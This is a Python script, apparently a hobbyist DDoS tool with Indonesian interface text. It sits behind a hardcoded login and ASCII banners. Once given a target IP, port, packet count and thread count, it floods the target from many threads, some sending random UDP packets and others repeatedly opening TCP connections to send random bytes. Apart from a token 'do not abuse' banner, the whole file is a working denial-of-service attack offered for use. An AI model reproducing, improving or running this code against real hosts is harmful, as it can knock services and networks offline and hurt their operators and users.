username ='Senzu'
password ='Ddos'
import random
import socket
import threading
import os,sys
import time

os.system("clear")

for i in range(3):
    urm = input("[•] Username: ")
    j=3
    if(urm==username):
        time.sleep(5)
        print("[+] Tunggu Sedang Di Check")
        break
    else:
        time.sleep(5)
        print("[×] Salah Username!!! ")
        continue
time.sleep(5)
print("[@] Username Berhasil")
time.sleep(5)

for i in range(3):
    pwd = input("[•] Password : ")
    j=3
    if(pwd==password):
        time.sleep(5)
        print("[+] Tunggu Sedang Di Check!!! ")
        break
    else:
        time.sleep(5)
        print("[×] Salah Password!!! ")
        continue
time.sleep(5)
print("[@] Login Berhasil")
time.sleep(5)

os.system("clear")
print("\033[91m")
print("""
██╗███╗░░██╗██████╗░██╗░░░██╗████████╗
██║████╗░██║██╔══██╗██║░░░██║╚══██╔══╝
██║██╔██╗██║██████╔╝██║░░░██║░░░██║░░░
██║██║╚████║██╔═══╝░██║░░░██║░░░██║░░░
██║██║░╚███║██║░░░░░╚██████╔╝░░░██║░░░
╚═╝╚═╝░░╚══╝╚═╝░░░░░░╚═════╝░░░░╚═╝░░░
""")
print("KETIK BAWAH")
print("DDOS-ATTACK")

test = input()
if test == "D":
    exit(5)
os.system("clear")
print("============⚠WARNING⚠︎============")
print("𝙹𝙰𝙽𝙶𝙰𝙽 𝙱𝚄𝙰𝚃 𝙰𝙱𝚄𝚂𝙴, 𝚃𝙾𝙾𝙻𝚂 𝙱𝚈 𝚂𝙴𝙽𝚉𝚄 𝙳𝙳𝙾𝚂")
print("============⚠WARNING⚠︎============")
time.sleep(10)

os.system("clear")
print ("Autor : Senzu ")
print("""\033[91m
██████╗░██████╗░░█████╗░░██████╗            
██╔══██╗██╔══██╗██╔══██╗██╔════╝            
██║░░██║██║░░██║██║░░██║╚█████╗░            
██║░░██║██║░░██║██║░░██║░╚═══██╗            
██████╔╝██████╔╝╚█████╔╝██████╔╝            
╚═════╝░╚═════╝░░╚════╝░╚═════╝░            

░█████╗░████████╗████████╗░█████╗░░█████╗░██╗░░██╗
██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔══██╗██║░██╔╝
███████║░░░██║░░░░░░██║░░░███████║██║░░╚═╝█████═╝░
██╔══██║░░░██║░░░░░░██║░░░██╔══██║██║░░██╗██╔═██╗░
██║░░██║░░░██║░░░░░░██║░░░██║░░██║╚█████╔╝██║░╚██╗
╚═╝░░╚═╝░░░╚═╝░░░░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝
""")
print("\033[0m")

ip = str(input("\033[91m Target Host/Ip:"))
port = int(input("\033[91m Target Port:"))
choice = str(input("\033[91m Gas Ddos? (y/n):"))
times = int(input("\033[91m Packets:"))
threads = int(input("\033[91m Threads:"))
print("APAKAH YAKIN IP INI? IP %s PORT %s"%(ip, port))
choice = str(input("y/n:"))
print("PROSES TUNGGU 5 DETIK")
time.sleep(5)

os.system("clear")
print("\033[91m")
print("LOADING.")
time.sleep(1)
print("LOADING..")
time.sleep(1)
print("LOADING...")
time.sleep(1)
print("LOADING....")
time.sleep(1)
print("LOADING.....")
time.sleep(1)
print("!!!!!!!PROGRAM START!!!!!!!")
time.sleep(3)
print("!!!!!!!LOOCKED IP %s PORT %s!!!!!!!"%(ip, port))
time.sleep(2)
print("!!!!!!!LOOCKED IP TUNGGU 10 DETIK!!!!!!!")
time.sleep(10)
os.system("clear")
def run():
        data = random._urandom(1081)
        i = random.choice(("\033[93m[@] (Senzu) ===> ","\033[93m[@] (Senzu) ===> ","\033[93m[@] (Senzu) ===> "))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        addr = (str(ip),int(port))
                        for x in range(times):
                                s.sendto(data,addr)
                        print(i +"\033[91m[+] Senzu Attack IP \033[0m%s \033[91mAttack PORT \033[0m%s"%(ip, port))
                except:
                        print("\033[91m[~] YAH KENDOS DEKKKKKG!!!")

def run2():
        data = random._urandom(1024)
        i = random.choice(("\033[93m[@] (Senzu) ===> ","\033[93m[@] (Senzu) ===> ","\033[93m[@] (Senzu) ===> "))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((ip,port))
                        s.send(data)
                        for x in range(times):
                                s.send(data)
                        print(i +"\033[91m[#] Senzu MEMBANTAI IP \033[0m%s \033[91mMENINDAS PORT \033[0m%s"%(ip, port))
                except:
                        s.close()
                        print("\033[91m[~] YAH KENDOS DEKKKKKG!!!")

def run3():
        data = random._urandom(16)
        i = random.choice(("\033[93m[@] (SENZU) ===> ","\033[93m[@] (SENZU) ===> ","\033[93m[@] (SENZU) ===> "))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((ip,port))
                        s.send(data)
                        for x in range(times):
                                s.send(data)
                        print(i +"\033[91m[×] Senzu MEMBANTAI IP \033[0m%s \033[91mMENINDAS PORT \033[0m%s"%(ip, port))
                except:
                        s.close()
                        print("\033[91m[~] YAH KENDOS DEKKKKKG!!!")


def run4():
        data = random._urandom(16)
        i = random.choice(("\033[93m[@] (SENZU) ===> ","\033[93m[@] (SENZU) ===> ","\033[93m[@] (SENZU) ===> "))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((ip,port))
                        s.send(data)
                        for x in range(times):
                                s.send(data)
                        print(i +"\033[91m Senzu MEMBANTAI IP \033[0m%s \033[91mPORT \033[0m%s"%(ip, port))
                except:
                        s.close()
                        print("\033[91m[~] YAH KENDOS DEKKKKKG!!!")

for y in range(threads):
        if choice == 'y':
                th = threading.Thread(target = run)
                th.start()
                th = threading.Thread(target = run2)
                th.start()
                th = threading.Thread(target = run3)
                th.start()
        else:
                th = threading.Thread(target = run4)
                th.start()
